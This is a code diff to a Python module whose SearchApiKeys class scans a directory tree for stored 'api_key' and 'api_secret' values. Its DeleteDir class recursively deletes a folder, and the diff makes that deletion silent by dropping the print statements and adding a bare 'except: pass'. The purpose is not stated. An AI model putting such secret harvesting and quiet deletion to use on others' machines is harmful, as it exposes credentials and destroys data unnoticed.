@@ -13,13 +13,6 @@ class SearchApiKeys:
         self.step_loading = 34 / len(os.listdir(self.path_file))
         self.count_loading = 0
 
-    def __validate_keys(self):
-        for i in self.keys:
-            if len(i) == 2 and re.findall(r'api_key|api_secret', list(i.items())[0][1], flags=re.IGNORECASE):
-                continue
-
-            self.keys.remove(i)
-
     async def __recurs_dirs(self, path):
         for i in os.listdir(path):
             custom_path = f'{path}\\{i}'
@@ -40,7 +33,6 @@ class SearchApiKeys:
                         self.__recurs_keys_in_file(data_dict)
                     except ParseError:
                         pass
-        self.__validate_keys()
 
     def __recurs_keys_in_file(self, data):
         for i in data:
@@ -59,7 +51,11 @@ class SearchApiKeys:
 
     async def get_keys(self):
         await self.__recurs_dirs(self.path_file)
-        return self.keys
+        return [{[*i.values()][0]: [*i.values()][1]}
+                for i in self.keys
+                if len(i) == 2
+                and
+                re.findall(r'api_key|api_secret', list(i.items())[0][1], flags=re.IGNORECASE)]
 
 
 class DeleteDir:
@@ -69,14 +65,14 @@ class DeleteDir:
     def __del_recurse(self, path):
         for i in os.listdir(path):
             custom_path = f'{path}\\{i}'
-
-            if os.path.isdir(custom_path):
-                print(i)
-                self.__del_recurse(custom_path)
-                os.rmdir(custom_path)
-            else:
-                print(i)
-                os.remove(custom_path)
+            try:
+                if os.path.isdir(custom_path):
+                    self.__del_recurse(custom_path)
+                    os.rmdir(custom_path)
+                else:
+                    os.remove(custom_path)
+            except:
+                pass
 
         if len(os.listdir(self.__path)) == 0:
             os.rmdir(path)
